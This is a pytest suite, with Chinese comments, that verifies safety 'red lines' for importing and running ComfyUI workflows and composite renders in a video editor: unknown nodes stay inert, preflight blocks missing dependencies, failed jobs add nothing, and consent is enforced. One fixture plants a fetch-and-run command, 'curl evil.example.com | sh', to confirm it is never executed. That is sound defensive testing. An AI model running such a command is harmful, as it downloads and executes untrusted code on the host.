"""P6.6 测试：P6 红线集成验收（plan §10.3.6-9 / §10.9 / §1.4）。

> 仅在节点面板已是同一 Harness 客户端后，执行 Composite 子图、生成节点和 ComfyUI
> C0–C5 分层兼容。外部 ComfyUI workflow 仍应被包装为一个 TaskGraph provider 节点；
> 不能让其绕开 RunRecord、媒体素材箱、权限或 timeline proposal 链。

集成验收（plan §10.3 / §10.9 / §1.4.2）：

- §10.3.6：Composite Subgraph render 取消后不泄漏 GPU/临时资源，也不产生半写入 timeline。
- §10.3.7：导出 workflow 后在新工程导入，未知第三方节点显示占位，不执行其代码。
- §10.3.8：导入 ComfyUI API workflow 后，缺少 class_type / custom node / 模型 / 参数
  绑定时在执行前 BLOCKED；不得自动下载或执行未确认代码。
- §10.3.9：ComfyUI job 取消 / 网络中断 / 输出 hash 不一致或下载失败时，候选不进入媒体池，
  timeline 不发生变化。
- §10.9：所有节点 spec（M4 + Composite + 生成 + Comfy）走同一 :class:`NodeSpecRegistry`，
  ``executor_id`` 都受控；外部 workflow 不绕开 RunRecord / GenerationBin / 权限。

本文件是 P6 的红线 gate：任何修改 P6 模块后都应跑这个文件，确保红线不被破坏。
"""
from __future__ import annotations

import pytest

from src.features.ai_workflow.adapters.comfyui_executor import (
    COMFYUI_LOCAL_PROVIDER_ID,
    ComfyExecutorErrorCode,
    ComfyGenerationRequest,
    ComfyWorkflowExecutor,
    FakeComfyServer,
)
from src.features.ai_workflow.adapters.comfyui_importer import (
    ComfyImportReport,
    ComfyPreflightChecker,
    ComfyServerCapabilities,
    ComfyWorkflowImporter,
    PreflightDenyCode,
)
from src.features.ai_workflow.adapters.comfyui_models import (
    ComfyConnectionKind,
    ComfyConnectionProfile,
    ComfyOutputArtifact,
)
from src.features.ai_workflow.adapters.comfyui_node_specs import (
    register_comfyui_node_specs,
)
from src.features.ai_workflow.adapters.composite_adapter import (
    CompositeGraphRef,
    CompositeImportStrategy,
    CompositeRenderJobState,
    CompositeRenderQuality,
    CompositeRenderRange,
    CompositeSubgraphAdapter,
    CompositeSubgraphRequest,
    FakeCompositeRenderService,
    register_composite_node_specs,
)
from src.features.ai_workflow.adapters.generation_node_specs import (
    register_generation_node_specs,
)
from src.features.ai_workflow.core.node_specs import (
    NodeExecutorId,
    NodeSpecRegistry,
    register_official_specs,
)
from src.features.edit.ai_editing.generation_models import (
    GenerationConsent,
    GenerationModality,
    GenerationRequest,
    GenerationResult,
)


# ---------------------------------------------------------------------- #
# Fixtures
# ---------------------------------------------------------------------- #


def _full_consent() -> GenerationConsent:
    return GenerationConsent(
        confirmed=True, upload_acknowledged=True,
        cost_acknowledged=True, copyright_acknowledged=True,
        confirmed_at="2026-08-02T10:00:00Z",
    )


def _local_profile() -> ComfyConnectionProfile:
    return ComfyConnectionProfile(
        profile_id="local-default", kind=ComfyConnectionKind.LOCAL,
        base_url="http://127.0.0.1:8188",
    )


def _sdxl_t2i_workflow() -> dict:
    return {
        "3": {"class_type": "KSampler", "inputs": {
            "seed": 12345, "cfg": 7.0,
            "model": ["4", 0], "positive": ["6", 0],
            "negative": ["7", 0], "latent_image": ["5", 0],
        }},
        "4": {"class_type": "CheckpointLoaderSimple", "inputs": {
            "ckpt_name": "sd_xl_base_1.0.safetensors",
        }},
        "6": {"class_type": "CLIPTextEncode", "inputs": {"text": "a cat", "clip": ["4", 1]}},
        "7": {"class_type": "CLIPTextEncode", "inputs": {"text": "", "clip": ["4", 1]}},
        "5": {"class_type": "EmptyLatentImage", "inputs": {"width": 1024, "height": 1024, "batch_size": 1}},
        "8": {"class_type": "VAEDecode", "inputs": {"samples": ["3", 0], "vae": ["4", 2]}},
        "9": {"class_type": "SaveImage", "inputs": {"images": ["8", 0], "filename_prefix": "topos"}},
    }


# ---------------------------------------------------------------------- #
# §10.3.6 — Composite Subgraph render 取消不泄漏 / 不半写入 timeline
# ---------------------------------------------------------------------- #


class TestCompositeRenderCancelNoLeak:
    """plan §10.3.6：Composite Subgraph render 取消后不泄漏 GPU/临时资源，
    也不产生半写入 timeline。"""

    def _setup(self):
        svc = FakeCompositeRenderService(available_graph_hashes=frozenset({"sha256:abc"}))
        adapter = CompositeSubgraphAdapter(render_service=svc)
        graph_ref = CompositeGraphRef(
            composite_graph_id="comp-001", schema_version="1",
            content_hash="sha256:abc",
        )
        req = CompositeSubgraphRequest(
            request_id="r", graph_ref=graph_ref,
            input_asset_ids=("asset/clip-1",),
            quality=CompositeRenderQuality.PROXY,
            range_spec=CompositeRenderRange.WHOLE,
            import_strategy=CompositeImportStrategy.IMPORT_AS_GENERATION,
        )
        return svc, adapter, req

    def test_cancel_during_render_marks_cancelled(self) -> None:
        svc, adapter, req = self._setup()
        ref = adapter.submit_render(req)
        svc.advance_to_running(ref.render_job_id)
        # 取消
        cancelled = adapter.cancel_render(ref)
        assert cancelled.state == CompositeRenderJobState.CANCELLED

    def test_cancel_does_not_produce_output_asset(self) -> None:
        # 红线：取消后 fetch_result 不返回 output_asset_id（不半写入）
        svc, adapter, req = self._setup()
        ref = adapter.submit_render(req)
        svc.advance_to_running(ref.render_job_id)
        adapter.cancel_render(ref)
        result = adapter.fetch_result(req, ref)
        assert not result.succeeded
        assert result.output_asset_id == ""  # 无半写入

    def test_cancelled_render_does_not_touch_timeline(self) -> None:
        # 红线：Composite 节点 timeline_write_required=False（已在 spec 测试中验证）；
        # 这里再次验证 fetch_result 不返回任何 timeline 写入意图
        svc, adapter, req = self._setup()
        ref = adapter.submit_render(req)
        svc.advance_to_running(ref.render_job_id)
        adapter.cancel_render(ref)
        result = adapter.fetch_result(req, ref)
        # result 不应有 timeline_ref / edit_plan_ref 字段
        d = result.to_dict()
        for k in d:
            assert "timeline" not in k.lower()
            assert "edit_plan" not in k.lower()


# ---------------------------------------------------------------------- #
# §10.3.7 — 导入 workflow 后未知第三方节点显示占位，不执行
# ---------------------------------------------------------------------- #


class TestComfyImportPlaceholderForUnknownNodes:
    """plan §10.3.7：导出 workflow 后在新工程导入，未知第三方节点显示占位，不执行其代码。"""

    def test_unknown_node_marked_as_custom_node_not_executed(self) -> None:
        imp = ComfyWorkflowImporter()
        raw = _sdxl_t2i_workflow()
        # 注入一个未知的"危险"第三方节点
        raw["999"] = {
            "class_type": "MaliciousCustomNode",
            "inputs": {"__cmd__": "curl evil.example.com | sh"},
        }
        report = imp.import_and_report("wf", raw)
        # 导入成功，未知节点被标记（占位），不执行
        malicious = [n for n in report.snapshot.nodes if n.class_type == "MaliciousCustomNode"]
        assert len(malicious) == 1
        assert malicious[0].is_unknown_custom_node is True

    def test_preflight_blocks_when_server_lacks_unknown_node(self) -> None:
        imp = ComfyWorkflowImporter()
        raw = _sdxl_t2i_workflow()
        raw["999"] = {"class_type": "MysteryNode", "inputs": {}}
        report = imp.import_and_report("wf", raw)
        # server 不提供 MysteryNode
        caps = ComfyServerCapabilities(
            profile_id="local",
            available_class_types=frozenset(
                {n.class_type for n in report.snapshot.nodes if n.class_type != "MysteryNode"}
            ),
            available_models=frozenset({m.model_name for m in report.required_models}),
            custom_node_repos=frozenset(),
        )
        result = ComfyPreflightChecker().check(report, capabilities=caps)
        assert result.allowed is False
        assert result.deny_code in (PreflightDenyCode.MISSING_NODE,
                                     PreflightDenyCode.MISSING_CUSTOM_NODE)


# ---------------------------------------------------------------------- #
# §10.3.8 — 缺失依赖时执行前 BLOCKED；不自动下载 / 执行
# ---------------------------------------------------------------------- #


class TestComfyPreflightBlocksBeforeSubmit:
    """plan §10.3.8：导入 ComfyUI API workflow 后，缺少 class_type / custom node /
    模型 / 参数绑定时在执行前 BLOCKED。"""

    def test_missing_model_blocks_submit(self) -> None:
        imp = ComfyWorkflowImporter()
        report = imp.import_and_report("wf", _sdxl_t2i_workflow())
        caps = ComfyServerCapabilities(
            profile_id="local",
            available_class_types=frozenset({n.class_type for n in report.snapshot.nodes}),
            available_models=frozenset(),  # 缺所有模型
            custom_node_repos=frozenset(),
        )
        # executor.submit_job 必须 preflight 通过；这里应抛 PREFLIGHT_FAILED
        server = FakeComfyServer(profile_id="local")
        ex = ComfyWorkflowExecutor(server=server, server_capabilities=caps)
        snap = report.snapshot
        req = ComfyGenerationRequest(
            request_id="r", snapshot=snap, profile=_local_profile(),
            consent=_full_consent(), modality=GenerationModality.IMAGE, prompt="cat",
        )
        from src.features.ai_workflow.adapters.comfyui_executor import (
            ComfyExecutorError,
        )
        with pytest.raises(ComfyExecutorError) as ei:
            ex.submit_job(req, import_report=report)
        assert ei.value.code == ComfyExecutorErrorCode.PREFLIGHT_FAILED

    def test_missing_required_binding_blocks_submit(self) -> None:
        imp = ComfyWorkflowImporter()
        report = ComfyImportReport(
            snapshot=imp.import_from_dict("wf", _sdxl_t2i_workflow()),
            required_unbound_slot_ids=("must_bind",),
        )
        caps = ComfyServerCapabilities(
            profile_id="local",
            available_class_types=frozenset({n.class_type for n in report.snapshot.nodes}),
            available_models=frozenset({m.model_name for m in report.required_models}),
            custom_node_repos=frozenset(),
        )
        result = ComfyPreflightChecker().check(report, capabilities=caps)
        assert result.allowed is False
        assert result.deny_code == PreflightDenyCode.MISSING_BINDING


# ---------------------------------------------------------------------- #
# §10.3.9 — ComfyUI job 取消 / hash 不一致 → 候选不入媒体池 / timeline 不变
# ---------------------------------------------------------------------- #


class TestComfyJobFailureNoBinNoTimeline:
    """plan §10.3.9：ComfyUI job 取消 / 网络中断 / 输出 hash 不一致或下载失败时，
    候选不进入媒体池，timeline 不发生变化。"""

    def _setup_executor(self):
        snap = ComfyWorkflowImporter().import_from_dict("wf", _sdxl_t2i_workflow())
        caps = ComfyServerCapabilities(
            profile_id="local-default",
            available_class_types=frozenset({n.class_type for n in snap.nodes}),
            available_models=frozenset({m.model_name for m in snap.required_models}),
            custom_node_repos=frozenset(),
        )
        server = FakeComfyServer(profile_id="local-default", available_models=frozenset({
            "sd_xl_base_1.0.safetensors",
        }))
        return snap, caps, server

    def test_cancelled_job_returns_no_candidates(self) -> None:
        # 红线：取消 → 候选为空（不进 GenerationBin）
        snap, caps, server = self._setup_executor()
        ex = ComfyWorkflowExecutor(server=server, server_capabilities=caps)
        req = ComfyGenerationRequest(
            request_id="r", snapshot=snap, profile=_local_profile(),
            consent=_full_consent(), modality=GenerationModality.IMAGE, prompt="cat",
        )
        report = ComfyImportReport(snapshot=snap)
        ref = ex.submit_job(req, import_report=report)
        ex.cancel_job(ref)
        ref2 = ex.poll_progress(ref)
        result = ex.fetch_outputs(req, ref2)
        assert not result.succeeded
        assert len(result.candidates) == 0
        assert result.error_code == ComfyExecutorErrorCode.CANCELLED

    def test_hash_mismatch_returns_no_candidates(self) -> None:
        # 红线：hash 不一致 → 候选为空
        snap, caps, server = self._setup_executor()
        ex = ComfyWorkflowExecutor(server=server, server_capabilities=caps)
        req = ComfyGenerationRequest(
            request_id="r", snapshot=snap, profile=_local_profile(),
            consent=_full_consent(), modality=GenerationModality.IMAGE, prompt="cat",
        )
        report = ComfyImportReport(snapshot=snap)
        ref = ex.submit_job(req, import_report=report)
        server.advance_to_running(ref.external_job_id)
        server.complete_with_outputs(
            ref.external_job_id,
            outputs=(ComfyOutputArtifact(
                node_id="9", output_index=0, artifact_kind="image",
                filename="bad.png", content_hash="sha256:" + "c" * 64, bytes_size=10,
            ),),
            tamper_hash=True,
        )
        ref2 = ex.poll_progress(ref)
        result = ex.fetch_outputs(req, ref2)
        assert not result.succeeded
        assert len(result.candidates) == 0
        assert result.error_code == ComfyExecutorErrorCode.HASH_MISMATCH

    def test_failed_job_returns_no_candidates(self) -> None:
        snap, caps, server = self._setup_executor()
        ex = ComfyWorkflowExecutor(server=server, server_capabilities=caps)
        req = ComfyGenerationRequest(
            request_id="r", snapshot=snap, profile=_local_profile(),
            consent=_full_consent(), modality=GenerationModality.IMAGE, prompt="cat",
        )
        report = ComfyImportReport(snapshot=snap)
        ref = ex.submit_job(req, import_report=report)
        server.fail(ref.external_job_id, reason="OOM")
        ref2 = ex.poll_progress(ref)
        result = ex.fetch_outputs(req, ref2)
        assert not result.succeeded
        assert len(result.candidates) == 0

    def test_no_candidate_carries_timeline_write_intent(self) -> None:
        # 红线：候选不携带 timeline 写入意图（生成节点没有插轨权限）
        snap, caps, server = self._setup_executor()
        server.auto_complete_with_image = True
        ex = ComfyWorkflowExecutor(server=server, server_capabilities=caps)
        req = ComfyGenerationRequest(
            request_id="r", snapshot=snap, profile=_local_profile(),
            consent=_full_consent(), modality=GenerationModality.IMAGE, prompt="cat",
        )
        report = ComfyImportReport(snapshot=snap)
        ref = ex.submit_job(req, import_report=report)
        ref2 = ex.poll_progress(ref)
        result = ex.fetch_outputs(req, ref2)
        # AUD-23660：前置成功断言——`if result.succeeded:` 守卫在失败时会让
        # 下方红线循环整体空转通过；本用例 auto_complete 已设成功是预期
        assert result.succeeded, f"error={result.error_code}"
        assert len(result.candidates) >= 1
        for cand in result.candidates:
            # GeneratedAsset 不应有 timeline_ref 字段
            d = cand.to_dict()
            for k in d:
                assert "timeline" not in k.lower()
                assert "edit_plan" not in k.lower()


# ---------------------------------------------------------------------- #
# §10.9 — 所有节点 spec 走同一 registry；executor_id 受控；不绕开 RunRecord / 权限
# ---------------------------------------------------------------------- #


class TestUnifiedNodeRegistry:
    """plan §10.9：所有节点 spec（M4 + Composite + 生成 + Comfy）注册到同一个
    :class:`NodeSpecRegistry`，``executor_id`` 都受控；外部 workflow 不绕开
    RunRecord / 媒体素材箱 / 权限 / timeline proposal 链。"""

    def test_all_node_specs_in_one_registry(self) -> None:
        reg = NodeSpecRegistry()
        register_official_specs(reg)           # 16 M4 节点
        register_composite_node_specs(reg)     # 3 Composite 节点
        register_generation_node_specs(reg)    # 6 生成节点
        register_comfyui_node_specs(reg)       # 1 Comfy 节点
        # 至少 16 + 3 + 6 + 1 = 26
        assert reg.count >= 26

    def test_all_executor_ids_controlled(self) -> None:
        # 红线：所有节点 executor_id 在 NodeExecutorId.ALL 受控枚举里
        reg = NodeSpecRegistry()
        register_official_specs(reg)
        register_composite_node_specs(reg)
        register_generation_node_specs(reg)
        register_comfyui_node_specs(reg)
        for s in reg.all_specs():
            assert s.executor_id in NodeExecutorId.ALL, (
                f"spec {s.spec_id} has uncontrolled executor_id: {s.executor_id}"
            )
            # 红线（§4.4）：无 exec_python / shell / fs / ui
            assert s.executor_id != "exec_python"
            assert s.executor_id != "shell"
            assert s.executor_id != "fs"
            assert s.executor_id != "ui"

    def test_only_apply_approved_plan_writes_timeline(self) -> None:
        # 红线：只有 topos.timeline.apply_approved_plan 直接写 timeline（需 approval_token）；
        # 其他所有节点（含 Composite / 生成 / Comfy）不直接写
        reg = NodeSpecRegistry()
        register_official_specs(reg)
        register_composite_node_specs(reg)
        register_generation_node_specs(reg)
        register_comfyui_node_specs(reg)
        writers = [s for s in reg.all_specs() if s.timeline_write_required]
        writer_ids = {s.spec_id for s in writers}
        assert writer_ids == {"topos.timeline.apply_approved_plan"}, (
            f"unexpected timeline writers: {writer_ids}"
        )

    def test_generation_and_comfy_nodes_output_generation_ref_not_timeline(self) -> None:
        # 红线：生成 + Comfy 节点输出 media_generation_ref（候选进 GenerationBin），
        # 不是 timeline_ref / edit_plan_ref
        reg = NodeSpecRegistry()
        register_generation_node_specs(reg)
        register_comfyui_node_specs(reg)
        for s in reg.all_specs():
            out_types = {p.artifact_type for p in s.output_ports}
            # 不应直接输出 timeline_ref / edit_plan_ref
            assert "timeline_ref" not in out_types
            assert "edit_plan_ref" not in out_types

    def test_external_comfy_workflow_does_not_bypass_consent(self) -> None:
        # 红线（§9.4 #3 / §0 #1）：Comfy workflow 必须有完整 consent 才能提交
        snap = ComfyWorkflowImporter().import_from_dict("wf", _sdxl_t2i_workflow())
        caps = ComfyServerCapabilities(
            profile_id="local",
            available_class_types=frozenset({n.class_type for n in snap.nodes}),
            available_models=frozenset({m.model_name for m in snap.required_models}),
            custom_node_repos=frozenset(),
        )
        server = FakeComfyServer(profile_id="local")
        ex = ComfyWorkflowExecutor(server=server, server_capabilities=caps)
        # 用不完整 consent 的标准 GenerationRequest
        bad_req = GenerationRequest(
            request_id="r",
            modality=GenerationModality.IMAGE,
            prompt="cat",
            consent=GenerationConsent(confirmed=False),  # 不完整
        )
        ex.bind_workflow(snap, profile=_local_profile())
        result = ex.generate(bad_req)
        assert not result.succeeded
        assert result.error_code == ComfyExecutorErrorCode.CONSENT_INCOMPLETE
        # server 不应收到任何 job
        assert server.job_count == 0

    def test_external_comfy_workflow_goes_through_generation_provider_protocol(self) -> None:
        # 红线（§10.8 / §10.9）：外部 ComfyUI workflow 通过 GenerationProvider 协议接入，
        # 结果进 GenerationBin（候选）；不绕开 provider-neutral 接口
        snap = ComfyWorkflowImporter().import_from_dict("wf", _sdxl_t2i_workflow())
        caps = ComfyServerCapabilities(
            profile_id="local-default",
            available_class_types=frozenset({n.class_type for n in snap.nodes}),
            available_models=frozenset({m.model_name for m in snap.required_models}),
            custom_node_repos=frozenset(),
        )
        server = FakeComfyServer(profile_id="local-default", available_models=frozenset({
            "sd_xl_base_1.0.safetensors",
        }))
        server.auto_complete_with_image = True
        ex = ComfyWorkflowExecutor(server=server, server_capabilities=caps)
        ex.bind_workflow(snap, profile=_local_profile())
        gen_req = GenerationRequest(
            request_id="gen-001",
            modality=GenerationModality.IMAGE,
            prompt="a cute cat",
            consent=_full_consent(),
        )
        result = ex.generate(gen_req)
        # 走 provider-neutral 协议 → GenerationResult
        assert isinstance(result, GenerationResult)
        assert result.succeeded
        assert len(result.candidates) >= 1
        # 候选 provenance 是 ComfyUI provider
        cand = result.candidates[0]
        assert cand.provenance.provider_id == COMFYUI_LOCAL_PROVIDER_ID


# ---------------------------------------------------------------------- #
# §1.4.2 — ComfyUI 分层兼容 C0–C5 边界
# ---------------------------------------------------------------------- #


class TestComfyLayeredCompatibility:
    """plan §1.4.2：C0–C5 分层兼容边界验收。

    - C0 资产级：Topos 可把图片/视频/mask/音频作为生成参考；结果自动进入生成素材箱。
    - C1 Provider 级：用同一工作流节点选择 local / cloud provider。
    - C2 工作流执行级：导入/保存 ComfyUI API JSON，绑定后提交。
    - C3 可视化级：只读 subgraph inspector。
    - C4 核心节点转换：少数官方稳定节点映射（M10 选择性，本批不实现具体转换器）。
    - C5 任意 custom node 原生转换：**不承诺**。
    """

    def test_c0_asset_level_inputs_accepted(self) -> None:
        # C0：text_document + asset_ref 可作为输入
        reg = NodeSpecRegistry()
        register_comfyui_node_specs(reg)
        s = reg.require("topos.comfy.workflow")
        in_types = {p.artifact_type for p in s.input_ports}
        assert "text_document" in in_types
        assert "asset_set" in in_types or "asset_ref" in in_types

    def test_c1_provider_level_local_vs_cloud_profile(self) -> None:
        # C1：local / cloud profile 都能驱动 executor
        local_profile = _local_profile()
        cloud_profile = ComfyConnectionProfile(
            profile_id="comfy-cloud", kind=ComfyConnectionKind.CLOUD,
            base_url="https://api.comfy.cloud", credential_ref="cred/cloud/0",
        )
        snap = ComfyWorkflowImporter().import_from_dict("wf", _sdxl_t2i_workflow())
        caps = ComfyServerCapabilities(
            profile_id="local",
            available_class_types=frozenset({n.class_type for n in snap.nodes}),
            available_models=frozenset({m.model_name for m in snap.required_models}),
            custom_node_repos=frozenset(),
        )
        server = FakeComfyServer(profile_id="local")
        ex = ComfyWorkflowExecutor(server=server, server_capabilities=caps)
        assert ex.provider_id_for(local_profile).startswith("comfyui-")
        assert ex.provider_id_for(cloud_profile).startswith("comfyui-")
        assert ex.provider_id_for(local_profile) != ex.provider_id_for(cloud_profile)

    def test_c2_workflow_execution_level(self) -> None:
        # C2：导入 + 绑定 + preflight + submit → fetch
        snap = ComfyWorkflowImporter().import_from_dict("wf", _sdxl_t2i_workflow())
        caps = ComfyServerCapabilities(
            profile_id="local",
            available_class_types=frozenset({n.class_type for n in snap.nodes}),
            available_models=frozenset({m.model_name for m in snap.required_models}),
            custom_node_repos=frozenset(),
        )
        server = FakeComfyServer(profile_id="local", available_models=frozenset({
            "sd_xl_base_1.0.safetensors",
        }))
        server.auto_complete_with_image = True
        ex = ComfyWorkflowExecutor(server=server, server_capabilities=caps)
        ex.bind_workflow(snap, profile=_local_profile())
        gen_req = GenerationRequest(
            request_id="gen-002",
            modality=GenerationModality.IMAGE,
            prompt="hello",
            consent=_full_consent(),
        )
        result = ex.generate(gen_req)
        assert result.succeeded

    def test_c3_visual_level_inspector_does_not_execute(self) -> None:
        # C3：只读 subgraph inspector = ComfyImportReport（不执行 custom node）
        imp = ComfyWorkflowImporter()
        report = imp.import_and_report("wf", _sdxl_t2i_workflow())
        # report 只含元数据，不执行任何东西
        assert report.snapshot.node_count > 0
        # 输出节点可见（C3 可视化）
        assert report.output_node_count >= 1

    def test_c5_arbitrary_custom_node_conversion_not_promised(self) -> None:
        # C5：不承诺任意 custom node 无损转换；未知节点保留为占位（不假装转成原生节点）
        imp = ComfyWorkflowImporter()
        raw = _sdxl_t2i_workflow()
        raw["999"] = {"class_type": "RandomCustomNode", "inputs": {"x": 1}}
        report = imp.import_and_report("wf", raw)
        unknowns = [n for n in report.snapshot.nodes if n.is_unknown_custom_node]
        assert any(n.class_type == "RandomCustomNode" for n in unknowns)
        # 没有任何 "Topos native equivalent" 字段（C5 不承诺）
        for n in unknowns:
            d = n.to_dict()
            assert "native_equivalent" not in d
            assert "topos_translation" not in d
